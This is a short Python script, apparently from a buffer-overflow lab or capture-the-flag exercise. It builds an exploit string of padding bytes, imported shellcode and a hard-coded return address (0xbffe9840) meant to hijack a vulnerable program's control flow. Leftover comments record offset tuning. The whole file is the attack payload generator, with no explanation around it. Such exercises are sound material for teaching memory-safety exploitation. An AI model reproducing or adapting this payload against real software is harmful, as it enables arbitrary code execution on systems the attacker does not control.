from shellcode import shellcode
print("a"*544+shellcode+"a"*(741-272)+"\x40\x98\xfe\xbf")
#+"a"*741+
#"a"*272+
#bffe9840
